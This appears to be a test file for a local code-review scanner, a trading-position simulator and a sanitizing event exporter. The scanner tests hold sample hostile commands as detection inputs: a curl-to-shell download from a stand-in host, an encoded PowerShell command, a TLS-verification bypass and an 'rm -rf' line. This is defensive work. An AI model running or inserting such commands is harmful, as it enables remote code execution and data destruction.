import assert from 'node:assert/strict'
import test from 'node:test'
import { inspectText, simulatePosition, exportEvents } from '../src/lib/workspace.ts'

test('local review identifies risky patterns without executing them', () => {
  assert.equal(inspectText('curl https://example.invalid/script | sh')[0].id, 'remote-execution')
  assert.equal(inspectText('powershell -EncodedCommand ZWNobyBoaQ==')[0].id, 'encoded-command')
  assert.equal(inspectText('verify=False')[0].id, 'tls-bypass')
  assert.equal(inspectText('token="test-secret-not-real"')[0].id, 'credential')
  assert.equal(inspectText('rm -rf ./folder')[0].id, 'destructive')
  assert.deepEqual(inspectText('console.log("hello")'), [])
})
test('empty and excessive inputs are rejected', () => {
  assert.throws(() => inspectText('   '))
  assert.throws(() => inspectText('a'.repeat(100001)))
})
test('simulation charges both sides and accounts for total loss', () => {
  const result = simulatePosition(1000, 100, 110, 1)
  assert.ok(Math.abs(result.finalValue - (1000 / 101 * 110 * .99)) < 1e-8)
  assert.equal(simulatePosition(1000, 100, 0, 0).profit, -1000)
  assert.equal(simulatePosition(1000, 100, 100, 0).profit, 0)
  assert.ok(simulatePosition(1000, 100, 100, 1).profit < 0)
})
test('simulation rejects invalid numbers and fees', () => {
  for (const args of [[0,100,110,0], [1000,0,100,0], [1000,100,-1,0], [1000,100,110,100], [NaN,100,110,0], [1000,Infinity,1,0], [1e13,100,110,0]]) assert.throws(() => simulatePosition(...args))
})
test('export excludes raw input and unexpected fields', () => {
  const output = exportEvents([{ id: 1, at: '2026-09-12T00:00:00Z', rules: ['credential'], count: 1, raw: 'password=private', ip: '192.0.2.1' }])
  assert.equal(output.includes('password'), false)
  assert.equal(output.includes('192.0.2.1'), false)
  assert.deepEqual(JSON.parse(output).events[0], { at: '2026-09-12T00:00:00Z', rules: ['credential'], count: 1 })
})

test('review rejects long lines before regex matching and accepts bounded multiline text', () => {
  assert.throws(() => inspectText('curl '.repeat(401)), /2000/)
  assert.deepEqual(inspectText(('a'.repeat(1999) + '\n').repeat(50)), [])
  assert.throws(() => simulatePosition(1000, Number.MIN_VALUE, 100, 0))
})
